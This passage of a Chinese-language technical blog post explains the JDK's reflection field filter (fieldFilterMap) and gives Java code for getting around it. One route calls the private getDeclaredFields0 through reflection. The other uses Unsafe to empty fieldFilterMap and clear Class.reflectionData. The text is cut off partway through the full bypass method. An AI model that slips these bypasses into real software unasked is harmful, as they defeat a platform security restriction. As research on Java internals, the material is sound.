null&#125;），或输入数组为空，则&lt;strong&gt;直接返回原数组&lt;/strong&gt;；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;保留&lt;strong&gt;原有顺序&lt;/strong&gt;；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;仅按&lt;strong&gt;简单名称&lt;/strong&gt;精确匹配，大小写敏感；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;时间复杂度约为 O(n)，其中 n 为字段数量（基于 Set 的均摊 O(1) 包含判断）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;注意&lt;/b&gt;：当直接返回原数组时，调用方不应修改该数组内容，应视为只读。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> containingClass 字段所属类（用于查表）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fields          待过滤的字段数组（通常来自 VM 的声明字段快照）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 过滤后的字段数组；若无过滤规则或数组为空，可能直接返回输入数组本身</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field[] filterFields(Class&lt;?&gt; containingClass, Field[] fields) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fieldFilterMap == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 未配置过滤表：不做任何处理</span></span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查出该类对应的黑名单并执行通用过滤逻辑</span></span><br><span class="line">    <span class="keyword">return</span> (Field[]) filter(fields, fieldFilterMap.get(containingClass));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按名称集合过滤给定的成员数组（字段/方法/构造器）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;本方法是对 &#123;<span class="doctag">@link</span> java.lang.reflect.Member&#125; 的通用实现：</span></span><br><span class="line"><span class="comment"> * 输入为同构成员数组（如 &#123;<span class="doctag">@code</span> Field[]&#125; / &#123;<span class="doctag">@code</span> Method[]&#125; / &#123;<span class="doctag">@code</span> Constructor[]&#125;），</span></span><br><span class="line"><span class="comment"> * 输出保持&lt;strong&gt;相同的数组组件类型&lt;/strong&gt;与&lt;strong&gt;原有相对次序&lt;/strong&gt;。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;匹配规则&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若 &#123;<span class="doctag">@code</span> filteredNames&#125; 为 &#123;<span class="doctag">@code</span> null&#125; 或 &#123;<span class="doctag">@code</span> members&#125; 为空 → 直接返回原数组；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若 &#123;<span class="doctag">@code</span> filteredNames&#125; 包含通配符 &#123;<span class="doctag">@code</span> &quot;*&quot;&#125; → 返回长度为 0 的同类型数组；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;否则：移除名称在 &#123;<span class="doctag">@code</span> filteredNames&#125; 内的成员；方法名匹配为“全删同名”，</span></span><br><span class="line"><span class="comment"> *       即对于方法的多重载，若名字在集合中，则所有该名称的重载都被移除。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;实现说明&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 通过 &#123;<span class="doctag">@code</span> Array.newInstance(members[0].getClass(), size)&#125; 构造&lt;strong&gt;与输入一致的数组类型&lt;/strong&gt;</span></span><br><span class="line"><span class="comment"> *（例如输入为 &#123;<span class="doctag">@code</span> Field[]&#125; 则返回的也是 &#123;<span class="doctag">@code</span> Field[]&#125;）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> members       同构的成员数组（不可为混合类型）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filteredNames 需要移除的成员名称集合；包含通配符 &#123;<span class="doctag">@code</span> &quot;*&quot;&#125; 时表示移除全部</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 过滤后的成员数组；若无需过滤或输入为空，可能直接返回输入数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Member[] filter(Member[] members, Set&lt;String&gt; filteredNames) &#123;</span><br><span class="line">    <span class="comment">// 无规则或无成员：直接返回原数组（保持零开销）</span></span><br><span class="line">    <span class="keyword">if</span> ((filteredNames == <span class="literal">null</span>) || (members.length == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组件类型：确保返回数组与输入数组类型一致（Field[] / Method[] / Constructor[]）</span></span><br><span class="line">    Class&lt;?&gt; memberType = members[<span class="number">0</span>].getClass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通配符：整类成员全部剔除，返回同类型的空数组</span></span><br><span class="line">    <span class="keyword">if</span> (filteredNames.contains(WILDCARD)) &#123;</span><br><span class="line">        <span class="keyword">return</span> (Member[]) Array.newInstance(memberType, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 单次扫描统计保留数（保持稳定次序，用两遍循环避免中间结构分配）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">kept</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Member m : members) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!filteredNames.contains(m.getName())) &#123;</span><br><span class="line">            kept++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若全被过滤：直接返回空数组</span></span><br><span class="line">    Member[] newMembers = (Member[]) Array.newInstance(memberType, kept);</span><br><span class="line">    <span class="keyword">if</span> (kept == <span class="number">0</span>) <span class="keyword">return</span> newMembers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二次扫描拷贝保留成员，保持原有顺序</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Member m : members) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!filteredNames.contains(m.getName())) &#123;</span><br><span class="line">            newMembers[i++] = m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newMembers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="调用-getDeclaredFields0-函数"><a href="#调用-getDeclaredFields0-函数" class="headerlink" title="调用 getDeclaredFields0 函数"></a>调用 getDeclaredFields0 函数</h5><p>由于过滤是基于 <code>getDeclaredFields0</code> 的结果进行的，而 <code>getDeclaredFields0</code> 本体在反射调用中并不会被限制（因为只有字段被限制获取，而方法没有被限制获取）：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> Field[]       getDeclaredFields0(<span class="type">boolean</span> publicOnly);</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以通过反射调用 <code>getDeclaredFields0</code> 获取字段，由此实现的 <code>getDeclaredField</code> 函数如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归获取指定类及其父类中的声明字段（包括私有字段）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz     目标类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fieldName 需要查找的字段名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 如果找到指定名称的字段，则返回该字段对象；否则返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">// 循环遍历当前类及其所有父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射获取 Class 类的私有方法 getDeclaredFields0</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeclaredFields0</span> <span class="operator">=</span> Class.class.getDeclaredMethod(<span class="string">&quot;getDeclaredFields0&quot;</span>, <span class="type">boolean</span>.class);</span><br><span class="line">            <span class="comment">// 设置该方法可访问，因为它是私有方法</span></span><br><span class="line">            getDeclaredFields0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 调用 getDeclaredFields0 方法获取指定类的所有字段（包括私有字段，但不包括父类的字段）</span></span><br><span class="line">            Field[] fields = (Field[]) getDeclaredFields0.invoke(clazz, <span class="literal">false</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 遍历该类的字段数组，查找是否有匹配的字段</span></span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldName.equals(field.getName())) &#123;</span><br><span class="line">                    <span class="comment">// 设置字段为可访问，以便后续可以修改或获取其值</span></span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> field; <span class="comment">// 返回找到的字段</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 发生异常时，抛出运行时异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 继续搜索父类中的字段，直到 clazz 为 null（即到达继承层级的顶端）</span></span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果在所有继承层级中都未找到该字段，则返回 null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>JDK17 和高版本的 JDK16 的模块化系统的限制增强，导致上述方法中的 <code>getDeclaredFields0.setAccessible(true);</code> 会出现如下报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.RuntimeException: java.lang.reflect.InaccessibleObjectException: Unable to make private native java.lang.reflect.Field[] java.lang.Class.getDeclaredFields0(boolean) accessible: module java.base does not &quot;opens java.lang&quot; to unnamed module @3d075dc0</span><br><span class="line">    at com.example.Main.getDeclaredField(Main.java:44)</span><br><span class="line">    at com.example.Main.main(Main.java:70)</span><br><span class="line">Caused by: java.lang.reflect.InaccessibleObjectException: Unable to make private native java.lang.reflect.Field[] java.lang.Class.getDeclaredFields0(boolean) accessible: module java.base does not &quot;opens java.lang&quot; to unnamed module @3d075dc0</span><br><span class="line">    at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:357)</span><br><span class="line">    at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)</span><br><span class="line">    at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:199)</span><br><span class="line">    at java.base/java.lang.reflect.Method.setAccessible(Method.java:193)</span><br><span class="line">    at com.example.Main.getDeclaredField(Main.java:29)</span><br><span class="line">    ... 1 more</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h5 id="置空-fieldFilterMap-1"><a href="#置空-fieldFilterMap-1" class="headerlink" title="置空 fieldFilterMap"></a>置空 fieldFilterMap</h5><p>另一种绕过方法是直接置空 <code>fieldFilterMap</code>，具体过程为：</p>
<ol>
<li><p><strong>读取 <code>Reflection.class</code> 字节码并创建匿名类。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; reflectionClass = Class.forName(<span class="string">&quot;jdk.internal.reflect.Reflection&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] classBuffer = reflectionClass.getResourceAsStream(<span class="string">&quot;Reflection.class&quot;</span>).readAllBytes();</span><br><span class="line">Class&lt;?&gt; reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<p>因为 <code>fieldFilterMap</code> 过滤了 <code>Reflection</code> 的所有成员，无法直接使用 <code>getDeclaredField</code> 获取 <code>Field</code>。因此这里通过 <code>unsafe.defineAnonymousClass()</code> 方法，基于原始 <code>Reflection</code> 类字节码，动态创建一个<strong>匿名类</strong>，从而可以由此匿名类来获取类成员 <code>fieldFilterMap</code>。</p>
</li>
<li><p><strong>获取 <code>fieldFilterMap</code> 字段并置空。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">fieldFilterMap</span> <span class="operator">=</span> reflectionAnonymousClass.getDeclaredField(<span class="string">&quot;fieldFilterMap&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fieldFilterMap.getType().isAssignableFrom(HashMap.class)) &#123;</span><br><span class="line">    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMap), <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>匿名类不受 <code>fieldFilterMap</code> 过滤，因此可以成功获取到原本无法访问的 <code>fieldFilterMap</code> 字段。之后检查字段类型是否为 <code>HashMap</code>，确保类型正确，并使用 <code>unsafe.putObject()</code> 将 <code>Reflection</code> 类中的静态字段 <code>fieldFilterMap</code> 替换为 <strong>新的空 <code>HashMap</code><strong>。这意味着反射 API 将</strong>不再过滤任何字段</strong>，从而<strong>绕过 Java 的反射安全机制</strong>。</p>
</li>
<li><p><strong>清除 <code>Class</code> 类的反射缓存。</strong></p>
<p>JVM 在第一次反射时，会将反射信息缓存到 <code>reflectionData</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ReflectionData&lt;T&gt; rd = reflectionData();</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// B) 缓存未命中：调用 VM 层获取原始字段数组，然后应用“敏感成员过滤”</span></span><br><span class="line"><span class="comment">//    Reflection.filterFields 会基于内部黑名单（fieldFilterMap）剔除不应暴露的字段</span></span><br><span class="line">res = Reflection.filterFields(<span class="built_in">this</span>, getDeclaredFields0(publicOnly));</span><br><span class="line"></span><br><span class="line"><span class="comment">// C) 回写缓存：分别缓存“全部声明字段”和“仅 public 声明字段”的结果</span></span><br><span class="line"><span class="keyword">if</span> (rd != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (publicOnly) &#123;</span><br><span class="line">        rd.declaredPublicFields = res;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rd.declaredFields = res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure></div>

<p>如果不清除缓存，<code>fieldFilterMap</code> 的修改不会立即生效，反射仍然会受到旧的限制</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A) 尝试从反射数据缓存读取（ReflectionData 由 Class 维护）</span></span><br><span class="line">ReflectionData&lt;T&gt; rd = reflectionData();</span><br><span class="line"><span class="keyword">if</span> (rd != <span class="literal">null</span>) &#123;</span><br><span class="line">    res = publicOnly ? rd.declaredPublicFields : rd.declaredFields;</span><br><span class="line">    <span class="keyword">if</span> (res != <span class="literal">null</span>) <span class="keyword">return</span> res; <span class="comment">// 命中缓存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过分析 <code>ReflectionData</code> 相关代码可以发现，<code>reflectionData</code> 函数本质上返回的是 <code>Class</code> 中用于缓存反射信息的 <code>ReflectionData</code> 字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反射支持（为 Class 的反射结果做缓存及失效控制）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 设计要点：</span></span><br><span class="line"><span class="comment"> * 1) 通过 SoftReference 缓存反射派生数据（字段/方法/构造器/接口等），在内存紧张时允许被 GC 回收；</span></span><br><span class="line"><span class="comment"> * 2) 通过 classRedefinedCount 与 JVMTI 的 RedefineClasses() 钩子联动，当类（或其父类）被重定义时</span></span><br><span class="line"><span class="comment"> *    使缓存失效，从而保证反射结果与最新类结构一致；</span></span><br><span class="line"><span class="comment"> * 3) 所有关键字段使用 volatile，保证并发场景下的可见性；transient 避免将缓存随对象序列化。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 是否启用反射结果缓存的开关；可在极端调试/诊断场景关闭以每次都走真实计算。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">useCaches</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 每个 Class&lt;T&gt; 对应的一组反射缓存数据。</span></span><br><span class="line"><span class="comment"> * 注意：当 JVM TI 的 RedefineClasses() 重定义该类或其父类时，这些数据会过期。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReflectionData</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="comment">// 仅本类“声明”的字段（不含父类）</span></span><br><span class="line">    <span class="keyword">volatile</span> Field[] declaredFields;</span><br><span class="line">    <span class="comment">// 本类“public 字段” + 从父类继承下来的 public 字段</span></span><br><span class="line">    <span class="keyword">volatile</span> Field[] publicFields;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅本类“声明”的方法（不含父类）</span></span><br><span class="line">    <span class="keyword">volatile</span> Method[] declaredMethods;</span><br><span class="line">    <span class="comment">// 本类“public 方法” + 从父类继承下来的 public 方法</span></span><br><span class="line">    <span class="keyword">volatile</span> Method[] publicMethods;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅本类“声明”的构造器（所有可见性）</span></span><br><span class="line">    <span class="keyword">volatile</span> Constructor&lt;T&gt;[] declaredConstructors;</span><br><span class="line">    <span class="comment">// 本类的 public 构造器</span></span><br><span class="line">    <span class="keyword">volatile</span> Constructor&lt;T&gt;[] publicConstructors;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getFields/getMethods 计算过程中的中间产物（声明 + 过滤 public 后的版本）</span></span><br><span class="line">    <span class="keyword">volatile</span> Field[] declaredPublicFields;</span><br><span class="line">    <span class="keyword">volatile</span> Method[] declaredPublicMethods;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 本类直接实现的接口（不含父类实现的）</span></span><br><span class="line">    <span class="keyword">volatile</span> Class&lt;?&gt;[] interfaces;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建本 ReflectionData 时所记录的“类被重定义次数”。</span></span><br><span class="line">    <span class="comment">// 若后续 classRedefinedCount 改变，说明类结构已变，当前缓存即过期。</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> redefinedCount;</span><br><span class="line"></span><br><span class="line">    ReflectionData(<span class="type">int</span> redefinedCount) &#123;</span><br><span class="line">        <span class="built_in">this</span>.redefinedCount = redefinedCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 软引用包装的缓存容器：在内存吃紧时可被 GC 清理；</span></span><br><span class="line"><span class="comment">// volatile 确保并发读写的可见性；transient 防止序列化带出缓存内容。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">transient</span> SoftReference&lt;ReflectionData&lt;T&gt;&gt; reflectionData;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当该类或其父类被 JVMTI 的 RedefineClasses() 重定义时，JVM 会递增该计数。</span></span><br><span class="line"><span class="comment">// volatile 保证并发下读取到最新值。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">transient</span> <span class="type">int</span> <span class="variable">classRedefinedCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 懒加载并返回当前有效的 ReflectionData：</span></span><br><span class="line"><span class="comment"> * - 若缓存存在、未被 GC 回收、且与当前重定义计数相等 → 直接复用；</span></span><br><span class="line"><span class="comment"> * - 否则创建新的 ReflectionData 并替换（newReflectionData 内部完成写回）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ReflectionData&lt;T&gt; <span class="title function_">reflectionData</span><span class="params">()</span> &#123;</span><br><span class="line">    SoftReference&lt;ReflectionData&lt;T&gt;&gt; reflectionData = <span class="built_in">this</span>.reflectionData;</span><br><span class="line">    <span class="type">int</span> <span class="variable">classRedefinedCount</span> <span class="operator">=</span> <span class="built_in">this</span>.classRedefinedCount;</span><br><span class="line">    ReflectionData&lt;T&gt; rd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (useCaches &amp;&amp;</span><br><span class="line">        reflectionData != <span class="literal">null</span> &amp;&amp;                     <span class="comment">// 有软引用包装</span></span><br><span class="line">        (rd = reflectionData.get()) != <span class="literal">null</span> &amp;&amp;        <span class="comment">// 软引用尚未被 GC 清理</span></span><br><span class="line">        rd.redefinedCount == classRedefinedCount) &#123;   <span class="comment">// 与当前重定义计数一致 → 缓存有效</span></span><br><span class="line">        <span class="keyword">return</span> rd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有软引用 / 软引用已被清理 / 计数不一致（缓存过期）</span></span><br><span class="line">    <span class="comment">// → 创建并替换新的 ReflectionData（具体替换逻辑由 newReflectionData 实现）</span></span><br><span class="line">    <span class="keyword">return</span> newReflectionData(reflectionData, classRedefinedCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以参考前面从 <code>Reflection</code> 获取 <code>fieldFilterMap</code> 的方法从 <code>Class</code> 获取 <code>reflectionData</code> 字段并置为 <code>null</code>，<strong>强制 JVM 清空缓存</strong>，迫使其重新解析反射数据。清除缓存后，JVM 将重新读取并应用新的 <code>fieldFilterMap</code>，达到绕过限制的效果。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] clz = Class.class.getResourceAsStream(<span class="string">&quot;Class.class&quot;</span>).readAllBytes();</span><br><span class="line">Class&lt;?&gt; classAnonymousClass = unsafe.defineAnonymousClass(Class.class, clz, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">reflectionData</span> <span class="operator">=</span> classAnonymousClass.getDeclaredField(<span class="string">&quot;reflectionData&quot;</span>);</span><br><span class="line">unsafe.putObject(Class.class, unsafe.objectFieldOffset(reflectionData), <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>完整代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypassFieldFilterMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; 